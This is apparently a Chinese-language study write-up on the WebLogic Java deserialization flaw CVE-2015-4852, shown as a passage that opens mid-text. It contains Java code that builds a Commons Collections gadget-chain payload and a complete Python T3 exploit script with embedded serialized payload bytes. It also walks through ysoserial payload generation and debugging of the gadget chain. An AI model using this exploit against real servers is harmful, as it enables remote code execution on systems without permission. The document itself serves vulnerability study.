     //只需要有一处调用 chainedTransformer 
         Map inMap = new HashMap(); 
         inMap.put("key", "value"); 
         Map outMap = TransformedMap.decorate(inMap, null, chainedTransformer); 
         Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler"); 
         Constructor ctor = cls.getDeclaredConstructor(new Class[] { Class.class, Map.class }); 
         ctor.setAccessible(true); 
         Object instance = ctor.newInstance(new Object[] { Retention.class, outMap }); 
         FileOutputStream fos = new FileOutputStream("payload.ser"); 
         ObjectOutputStream oos = new ObjectOutputStream(fos); 
         oos.writeObject(instance); 
         oos.flush(); 
         oos.close(); 
         FileInputStream fis = new FileInputStream("payload.ser"); 
         ObjectInputStream ois = new ObjectInputStream(fis); 
         // 模拟触发代码执行 
         Object newObj = ois.readObject(); 
         ois.close(); 
       } 
     }
没有弹出计算器，
疑惑，于是调试一下，
可以看到，var7==null，所以无法进入第一个if。其余的条件应该比较好满足，所以这里要解决就是var7的值的问题。
在先知的一篇文章（https://xz.aliyun.com/t/7031）里看到了问题的答案，果然是对Java的了解和理解不够深入。
问题出在innerMap.put(“key”, “value”);上，我们分析一下var7的产生过程，看看为什么是null，
我们看var2的值，
可以看到，var3 = var2.menberTypes()，所以等于一个键值对”value” ->
{Class[@606](https://github.com/606 "@606")} “class
java.lang.annotation.RetentionPolicy”，
​ var5就是我们一开始的Map（innerMap.put(“key”,
“value”);），所以var6为var5.getKey()，即”key”，这样一来，var3.get(“key”)就是null，因为var3的键为”value”。  
这个问题产生的原因是：AnnotationType.getInstance(this.type)是一个和注解有关的函数，具体的细节这里也不过多解释，和这里的利用相关的一点就是，var3是一个注解元素的键值对，键为value，值为Ljava.lang.annotation.RetentionPolicy。  
想要修改使exp生效也很简单，将原句改为innerMap.put(“value”, “value”);即可。
#####  （二）LazyMap
根据ysoserial，调用链如图，
这里使用了动态代理，
前面提到，Ysoserial的CommonsCollections1采用的就是这种思路，故这一段的复现与调试放在下面的内容中
###  3.复现
网上流传的exp基本上都拥有相同的来源：
可能最原始的版本是这样的，
    #!/usr/bin/python 
    import socket
    import struct
    import sys
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    server_address = (sys.argv[1], int(sys.argv[2])) 
    print 'connecting to %s port %s' % server_address 
    sock.connect(server_address) 
    # Send headers 
    headers='t3 12.2.1\nAS:255\nHL:19\nMS:10000000\nPU:t3://us-l-breens:7001\n\n' 
    print 'sending "%s"' % headers 
    sock.sendall(headers) 
    data = sock.recv(1024) 
    print >>sys.stderr, 'received "%s"' % data 
    payloadObj = open(sys.argv[3],'rb').read() 
    payload='\x00\x00\x09\xe4\x01\x65\x01\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x71\x00\x00\xea\x60\x00\x00\x00\x18\x43\x2e\xc6\xa2\xa6\x39\x85\xb5\xaf\x7d\x63\xe6\x43\x83\xf4\x2a\x6d\x92\xc9\xe9\xaf\x0f\x94\x72\x02\x79\x73\x72\x00\x78\x72\x01\x78\x72\x02\x78\x70\x00\x00\x00\x0c\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x70\x70\x70\x70\x70\x70\x00\x00\x00\x0c\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x70\x06\xfe\x01\x00\x00\xac\xed\x00\x05\x73\x72\x00\x1d\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6a\x76\x6d\x2e\x43\x6c\x61\x73\x73\x54\x61\x62\x6c\x65\x45\x6e\x74\x72\x79\x2f\x52\x65\x81\x57\xf4\xf9\xed\x0c\x00\x00\x78\x70\x72\x00\x24\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x63\x6f\x6d\x6d\x6f\x6e\x2e\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2e\x50\x61\x63\x6b\x61\x67\x65\x49\x6e\x66\x6f\xe6\xf7\x23\xe7\xb8\xae\x1e\xc9\x02\x00\x09\x49\x00\x05\x6d\x61\x6a\x6f\x72\x49\x00\x05\x6d\x69\x6e\x6f\x72\x49\x00\x0b\x70\x61\x74\x63\x68\x55\x70\x64\x61\x74\x65\x49\x00\x0c\x72\x6f\x6c\x6c\x69\x6e\x67\x50\x61\x74\x63\x68\x49\x00\x0b\x73\x65\x72\x76\x69\x63\x65\x50\x61\x63\x6b\x5a\x00\x0e\x74\x65\x6d\x70\x6f\x72\x61\x72\x79\x50\x61\x74\x63\x68\x4c\x00\x09\x69\x6d\x70\x6c\x54\x69\x74\x6c\x65\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x4c\x00\x0a\x69\x6d\x70\x6c\x56\x65\x6e\x64\x6f\x72\x71\x00\x7e\x00\x03\x4c\x00\x0b\x69\x6d\x70\x6c\x56\x65\x72\x73\x69\x6f\x6e\x71\x00\x7e\x00\x03\x78\x70\x77\x02\x00\x00\x78\xfe\x01\x00\x00' 
    payload=payload+payloadObj 
    payload=payload+'\xfe\x01\x00\x00\xac\xed\x00\x05\x73\x72\x00\x1d\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6a\x76\x6d\x2e\x43\x6c\x61\x73\x73\x54\x61\x62\x6c\x65\x45\x6e\x74\x72\x79\x2f\x52\x65\x81\x57\xf4\xf9\xed\x0c\x00\x00\x78\x70\x72\x00\x21\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x63\x6f\x6d\x6d\x6f\x6e\x2e\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2e\x50\x65\x65\x72\x49\x6e\x66\x6f\x58\x54\x74\xf3\x9b\xc9\x08\xf1\x02\x00\x07\x49\x00\x05\x6d\x61\x6a\x6f\x72\x49\x00\x05\x6d\x69\x6e\x6f\x72\x49\x00\x0b\x70\x61\x74\x63\x68\x55\x70\x64\x61\x74\x65\x49\x00\x0c\x72\x6f\x6c\x6c\x69\x6e\x67\x50\x61\x74\x63\x68\x49\x00\x0b\x73\x65\x72\x76\x69\x63\x65\x50\x61\x63\x6b\x5a\x00\x0e\x74\x65\x6d\x70\x6f\x72\x61\x72\x79\x50\x61\x74\x63\x68\x5b\x00\x08\x70\x61\x63\x6b\x61\x67\x65\x73\x74\x00\x27\x5b\x4c\x77\x65\x62\x6c\x6f\x67\x69\x63\x2f\x63\x6f\x6d\x6d\x6f\x6e\x2f\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2f\x50\x61\x63\x6b\x61\x67\x65\x49\x6e\x66\x6f\x3b\x78\x72\x00\x24\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x63\x6f\x6d\x6d\x6f\x6e\x2e\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2e\x56\x65\x72\x73\x69\x6f\x6e\x49\x6e\x66\x6f\x97\x22\x45\x51\x64\x52\x46\x3e\x02\x00\x03\x5b\x00\x08\x70\x61\x63\x6b\x61\x67\x65\x73\x71\x00\x7e\x00\x03\x4c\x00\x0e\x72\x65\x6c\x65\x61\x73\x65\x56\x65\x72\x73\x69\x6f\x6e\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x5b\x00\x12\x76\x65\x72\x73\x69\x6f\x6e\x49\x6e\x66\x6f\x41\x73\x42\x79\x74\x65\x73\x74\x00\x02\x5b\x42\x78\x72\x00\x24\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x63\x6f\x6d\x6d\x6f\x6e\x2e\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2e\x50\x61\x63\x6b\x61\x67\x65\x49\x6e\x66\x6f\xe6\xf7\x23\xe7\xb8\xae\x1e\xc9\x02\x00\x09\x49\x00\x05\x6d\x61\x6a\x6f\x72\x49\x00\x05\x6d\x69\x6e\x6f\x72\x49\x00\x0b\x70\x61\x74\x63\x68\x55\x70\x64\x61\x74\x65\x49\x00\x0c\x72\x6f\x6c\x6c\x69\x6e\x67\x50\x61\x74\x63\x68\x49\x00\x0b\x73\x65\x72\x76\x69\x63\x65\x50\x61\x63\x6b\x5a\x00\x0e\x74\x65\x6d\x70\x6f\x72\x61\x72\x79\x50\x61\x74\x63\x68\x4c\x00\x09\x69\x6d\x70\x6c\x54\x69\x74\x6c\x65\x71\x00\x7e\x00\x05\x4c\x00\x0a\x69\x6d\x70\x6c\x56\x65\x6e\x64\x6f\x72\x71\x00\x7e\x00\x05\x4c\x00\x0b\x69\x6d\x70\x6c\x56\x65\x72\x73\x69\x6f\x6e\x71\x00\x7e\x00\x05\x78\x70\x77\x02\x00\x00\x78\xfe\x00\xff\xfe\x01\x00\x00\xac\xed\x00\x05\x73\x72\x00\x13\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6a\x76\x6d\x2e\x4a\x56\x4d\x49\x44\xdc\x49\xc2\x3e\xde\x12\x1e\x2a\x0c\x00\x00\x78\x70\x77\x46\x21\x00\x00\x00\x00\x00\x00\x00\x00\x00\x09\x31\x32\x37\x2e\x30\x2e\x31\x2e\x31\x00\x0b\x75\x73\x2d\x6c\x2d\x62\x72\x65\x65\x6e\x73\xa5\x3c\xaf\xf1\x00\x00\x00\x07\x00\x00\x1b\x59\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x00\x78\xfe\x01\x00\x00\xac\xed\x00\x05\x73\x72\x00\x13\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6a\x76\x6d\x2e\x4a\x56\x4d\x49\x44\xdc\x49\xc2\x3e\xde\x12\x1e\x2a\x0c\x00\x00\x78\x70\x77\x1d\x01\x81\x40\x12\x81\x34\xbf\x42\x76\x00\x09\x31\x32\x37\x2e\x30\x2e\x31\x2e\x31\xa5\x3c\xaf\xf1\x00\x00\x00\x00\x00\x78' 
    print 'sending payload...' 
    payload = "{0}{1}".format(struct.pack('!i', len(payload)), payload[4:]) 
    #print len(payload) 
    outf = open('pay.tmp','w') 
    outf.write(payload) 
    outf.close() 
    sock.send(payload)
解释一下思路，我们直接将序列化好的字节流发过去，服务器是不会响应的，必须先发t3协议的报头，得到服务端回应后再发送构造的字节流，就像这样，
T3协议本来就可以正常接收序列化的字节流，而且带有明显的标识，我们拿到正常的客户端发送的T3协议数据包，将第一组序列化数据替换为我们构造好的字节流，即可实现RCE。  
下面为Hex转储后的数据包，几个关键的标识已标出，
由此观之，exp中就是将ac ed 00 05到下一个 fe 01 00
00之间的部分替换为我们自己构造的反序列化字节流，并修改数据包头部的报文长度，封装好之后，即可发包。  
生成字节流可以使用ysoserial工具，一般是在JDK7下运行，否则可能会报错，
若遇到这样的问题，可在配置好环境变量的基础上，在注册表中将下面两个配置修改即可，
生成文件，
​ 用payload打一下，
​ 查看目录，
​ 成功。
这里验证的方法当然不唯一，学长的wget加nc的方法就记在心里。
###  4.调试
​ 开启docker与调试环境，
​ 用ysoserial生成的payload打过去，
​ 如果出现这样的问题，
点击File，点击Invalidate Caches/ Restart，
网传也许可以解决问题，没有解决我的问题，所以调试演示的效果并不是很好。
回到调试过程，断下，部分调用栈如下，
​
这个调用栈和我们的设计是相符的，先是进入AnnotationInvocationHandler的readObject函数，调用memerValues.entrySet，此时调用proxy代理的entrySet，其实会去调用被代理的lazymap类的entrySet，那么此时将触发代理类的invoke函数
​ 继续走，
var4的值为”entrySet”，显然会比较顺利的触发this.memberValues.get()函数，而memberValue已经被我们控制为LazyMap。这里不知什么原因断点断不下来，但接下来的运行过程证明一定会走get()而触发利用链。
​ F9到下一个断点，
可以看到，进入了get函数，且key为”entrySet”，接下来我们要的只是这一步factory.transform。
​ 接下来直接跟到ChainedTransformer的transform里，
​
这个参数object是个虚假的参数，我们的第一个Transformer是ConstantTransformer，所以无论参数是什么，都会返回Runtime。
​ 步入，
​ 继续，此时的object已经变成了java.lang.Runtime，
​ 步入，
​ 将返回Runtime的getRuntime函数对象，
​ 继续，此时object已经变成了getRuntime函数对象，
下面的过程其实都差不多，
​ 开启了sub process，
​ 接下来就会从AnnotationInvocationHandler的invoke不断退出。
总的过程大概如下，
## 四、感想与收获
​
一开始做的时候还是有些担心的，之前接触Java的题目都是些基本的、与Java服务器常见配置相关的，这次要深入Java的库中去分析漏洞，确实是有些难度。搭建环境的过程其实还是花费了一些功夫的，虽然最终选择了docker搭建，但在搭建的过程中还是有一些体会的（如Java的跨平台性）。
对漏洞的学习过程交织着对原理的理解和对Java基础知识的学习。在学习的过程中，我意识到这个链着实复杂，于是将整个链按照每一段的功能和触发点分成了三段，一次只重点学习一段，直到自认为当时已经理解了这一段，再去学习下一段。除此以外还要结合着动态调试加深自己对链的理解。
自我感觉现在的理解力与动手能力比之前有了一定提升，思路也得到了一定的开拓，但思维的高度还差的很远。在对CVE-2015-4852学习的过程中，我最开始的思路是先复现，复现成功之后才有调试一说，但两三天过去复现没能成功，就以为调试也只能在比较浅的层面进行，后来经高人指点，我意识到应通过查看日志、分析调用栈等方式分析为什么复现没有成功，才将整体的思路转变过来，得以将进度提快，比较顺利的完成学习。同时，我也意识到，理解是一个螺旋上升的过程，自己对Java反序列化漏洞的理解只是肤浅的和暂时的，日后有机会还要通过不断的学习和求教打破现有的认知，将其提升到新的高度。